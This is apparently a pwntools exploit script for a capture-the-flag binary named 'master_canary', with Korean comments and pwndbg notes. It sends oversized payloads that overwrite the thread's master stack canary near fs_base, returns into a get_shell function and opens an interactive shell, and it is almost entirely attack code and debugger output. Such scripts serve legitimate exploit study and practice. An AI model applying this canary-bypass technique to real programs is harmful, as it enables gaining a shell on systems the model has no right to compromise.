from pwn import *
context.log_level="debug"
p = process("./master_canary")
e = ELF("./master_canary")

get_shell = 0x400a4a
ret = 0x4007e1

def c1():
    p.sendlineafter(b"> ", b"1")
    
def c2(size, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

def c3(comment):
    p.sendlineafter(b"> ", b"3")
    p.sendafter(b"Leave comment: ", comment)

c1()

#c1() 이후 이미 thread_routine 함수는 종료한 상태이기에 p64(get_shell) 의미 X
# payload = b"A"*(0x110 - 8) + b"C"*0x8 + b"B"*0x8 + p64(ret) + p64(get_shell)
# length = len(payload)
# payload += b"A"*(0x920 - length)
# payload += p64(0x602700)
# payload += b"A"*16
# payload += b"C"*0x8

payload_test = b"A"*0x920 + p64(0x602800) + b"B"*16 + b"C"*0x8
payload_test2 = b"A"*0x30

size = len(payload_test)
c2(size, payload_test)
gdb.attach(p)
payload2 = b"A"*(0x28) + b"C"*0x8 + b"B"*0x8 + p64(ret) + p64(get_shell)
c3(payload2)

p.interactive()

# pwndbg> x/gx $rbp-0x110
# 0x7ffff7d9adb0: 0x0000000000000000
# fs_base        0x7ffff7d9b6c0
# 0x7ffff759c000  0x7ffff7d9f000 rw-p 803000 0 [anon_7ffff759c]
# RBP: 0x7ffff7d9aec0
# rbp-0x110 offset: 0x7fedb0

# pwndbg> p/x 0xb6c0-0xadb0
# $1 = 0x910: fs_base ~ rbp-0x110
# pwndbg> p/x $fs_base+0x28 - 0x7ffff7d9adb0
# $2 = 0x938: fs:0x28 ~ rbp-0x110
# pwndbg> p/x $fs_base+0x10 - 0x7ffff7d9adb0
# $3 = 0x920: fs:0x10 ~ rbp-0x110
# >> 
# pwndbg> p/x $1+0x920
# $2 = 0x7f8d5d5436d0
# pwndbg> p/x $1+0x110
# $3 = 0x7f8d5d542ec0